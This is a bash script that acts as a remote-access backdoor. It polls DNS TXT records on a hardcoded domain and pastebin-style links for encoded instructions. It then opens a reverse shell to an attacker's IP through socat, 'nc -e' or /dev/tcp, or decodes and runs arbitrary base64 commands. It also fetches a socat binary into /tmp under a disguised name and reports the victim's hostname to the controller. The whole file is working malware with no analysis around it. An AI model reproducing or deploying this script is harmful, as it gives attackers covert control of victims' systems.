#!/bin/bash

IP=""
PORT=""
INFO=""
NC=""
NCAT=""
SOCAT=""
SOCAT_LINK="https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat"
SOCAT_TMP_PATH="/tmp/sys_kernel_socat"
SH=""
BASH=""
SHELL=""
MD5=""
which nc &>/dev/null && NC=$(which nc)
which ncat &>/dev/null && NCAT=$(which ncat)
which socat &>/dev/null && SOCAT=$(which socat)
which md5sum &>/dev/null && MD5=$(which md5sum)
which sh &>/dev/null && SH=$(which sh) && SHELL=$SH
which bash &>/dev/null && BASH=$(which bash) && SHELL=$BASH

GETFILE=""
GETFIEL_OPT=""
STDOUT_OPT=""
FILEOUT_OPT=""
which wget &>/dev/null && WGET=$(which wget) && GETFILE=$WGET && GETFIEL_OPT="-q --dns-timeout=10 --connect-timeout=10 --timeout=60" && STDOUT_OPT="-O-" && FILEOUT_OPT="-O"
which curl &>/dev/null && CURL=$(which curl) && GETFILE=$CURL && GETFIEL_OPT="-s --connect-timeout 10 -m 60" && STDOUT_OPT="" && FILEOUT_OPT="-o"

PLink=''
DOMAIN='stttt.binhdinh.unixkernelhelp.com'

rand(){
    min=$1
    max=$(($2-$min+1))
    num=$(($RANDOM+1000000000))
    echo $(($num%$max+$min))
}

parse_ip(){
    ap=$1
    a=$(printf '%d' "0x${ap:0:2}")
    b=$(printf '%d' "0x${ap:2:2}")
    c=$(printf '%d' "0x${ap:4:2}")
    d=$(printf '%d' "0x${ap:6:2}")
    IP="$a.$b.$c.$d"
    PORT=$(printf '%d' "0x${ap:8:4}")
    return 0
}

do_reverse(){
    if [ -z "$IP" -o -z "$PORT" ];then
        return 1
    fi

    if [ -z "$SHELL" ];then
        return 1
    fi

    if [ "$1" == "d" ];then
        RAND_PORT=$(rand 10000 40000)
        HOSTNAME=$(echo `hostname`|base64)
        $GETFILE $GETFIEL_OPT $STDOUT_OPT "http://$IP:$PORT/$HOSTNAME-$RAND_PORT"
        PORT=$RAND_PORT
        sleep 30
    fi

    if [ -n "$NCAT" ];then
        NC=$NCAT
    fi

    if [ -z "$SOCAT" ];then
        $GETFILE $GETFIEL_OPT $FILEOUT_OPT $SOCAT_TMP_PATH $SOCAT_LINK
        if [ -f $SOCAT_TMP_PATH ];then
            FILEMD5=$($MD5 $SOCAT_TMP_PATH|awk '{print $1}')
            if [ "$FILEMD5" == "0ba908efef1395288c270c24cdefc31b" ];then
                chmod +x $SOCAT_TMP_PATH
                SOCAT=$SOCAT_TMP_PATH
            else
                rm -f $SOCAT_TMP_PATH
            fi
        fi
    fi
    if [ -n "$SOCAT" ];then
        $SOCAT exec:"$SHELL -li",pty,stderr,setsid,sigint,sane tcp:$IP:$((PORT+1))
        if [ $? -eq 0 ];then
            return 0
        fi
    fi
    if [ -n "$NC" ];then
        $NC -e $SHELL $IP $PORT
        if [ $? -eq 0 ];then
            return 0
        fi
    fi
    $SHELL -i >& /dev/tcp/$IP/$PORT 0>&1
    return $?
}

do_cmd(){
    if [ -z "$1" ];then
        return 1
    fi

    if [ -z "$SHELL" ];then
        return 1
    fi

    echo "$1"|base64 -d|$SHELL
    return $?
}

_pastebin(){
    if [ -z "$1" ];then
        return 1
    fi

    INFO=$($GETFILE $GETFIEL_OPT $STDOUT_OPT $1)
    if [ -z "$INFO" ];then
        return 1
    fi
    action
    return $?
}


_nslookup(){
    if [ -z "$1" ];then
        return 1
    fi

    INFO=$(nslookup -querytype=txt "$1"|awk -F\" '{print $2}'|grep -v -e '^$')
    if [ -z "$INFO" ];then
        return 1
    fi

    action
    return $?
}

action(){
    if [ -z "$INFO" ];then
        return 1
    fi

    if [[ "${INFO:0:5}" == 't=167' ]];then
        parse_ip "${INFO:5:50}"
        do_reverse
        return $?
    elif [[ "${INFO:0:2}" == 'd=' ]]; then
        _nslookup $(echo "${INFO:2:200}"|base64 -d)
        return $?
    elif [[ "${INFO:0:2}" == 'c=' ]]; then
        do_cmd "${INFO:2:4000}"
        return $?
    elif [[ "${INFO:0:2}" == 'l=' ]]; then
        _pastebin $(echo "${INFO:2:400}"|base64 -d)
        return $?
    elif [[ "${INFO:0:5}" == 'r=167' ]];then
        parse_ip "${INFO:5:50}"
        do_reverse 'd'
        return $?
    else
        return 1
    fi
}

gen_txt(){
    ip=$1
    port=$2
    a=$(printf '%02x' $(echo $ip|awk -F. '{print $1}'))
    b=$(printf '%02x' $(echo $ip|awk -F. '{print $2}'))
    c=$(printf '%02x' $(echo $ip|awk -F. '{print $3}'))
    d=$(printf '%02x' $(echo $ip|awk -F. '{print $4}'))
    ipX="$a$b$c$d"
    portX=$(printf "%x" $port)
    r="t=167${ipX}${portX}"
	echo "$1:$2"
    echo $r
}

gen_cmd(){
    echo "c=$(echo $1|base64)"
}

main(){
    echo $1
    if [ -n "$1" -a -f "$1" ];then
        while read line
        do
            if [ "${line:0:2}" == "l=" ];then
                PLink=$(echo ${line:2:400}|base64 -d)
            fi
            if [ "${line:0:2}" == "d=" ];then
                DOMAIN=$(echo ${line:2:200}|base64 -d)
            fi
        done < $1
    fi
    if [ -n "$PLink" ];then
        _pastebin "$PLink"
    fi
    if [ -n "$DOMAIN" ];then
        _nslookup "$DOMAIN"
    fi
}

#gen_txt 127.0.0.1 443
main $1
